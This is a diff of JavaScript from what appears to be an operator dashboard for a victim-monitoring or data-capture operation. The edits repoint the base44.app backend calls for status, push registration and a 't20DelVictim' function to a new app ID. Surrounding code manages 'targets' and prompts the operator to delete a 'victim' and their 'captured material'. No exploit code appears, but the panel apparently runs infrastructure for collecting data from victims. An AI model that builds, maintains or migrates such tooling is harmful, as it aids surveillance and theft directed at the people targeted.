@@ -337,7 +337,7 @@ function notify(title, body) {
   try { if (Notification.permission === 'granted') new Notification(title, {body}); } catch(e) {}
 }
 const $ = id => document.getElementById(id);
-const STATUS_URL = 'https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Status';
+const STATUS_URL = 'https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20Status';
 
 /* UTILS */
 function esc(s){return String(s||'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
@@ -707,7 +707,7 @@ async function vaciarTodo() {
   const allIds = [];
   for (const uid in S.targets) (S.targets[uid].ids || []).forEach(id => allIds.push(id));
   try {
-    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+    await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20DelVictim', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ ids: allIds })
     });
@@ -721,7 +721,7 @@ async function eliminarVictima(uid) {
   if (!T) return;
   if (!confirm('Eliminar victima y todo su material capturado?')) return;
   try {
-    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+    const r = await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20DelVictim', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ ids: T.ids || [] })
     });
@@ -758,7 +758,7 @@ async function enablePush() {
     if (!sub) {
       sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlB64ToU8(PUSH_KEY) });
     }
-    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20SavePush', {
+    const r = await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20SavePush', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         endpoint: sub.endpoint,
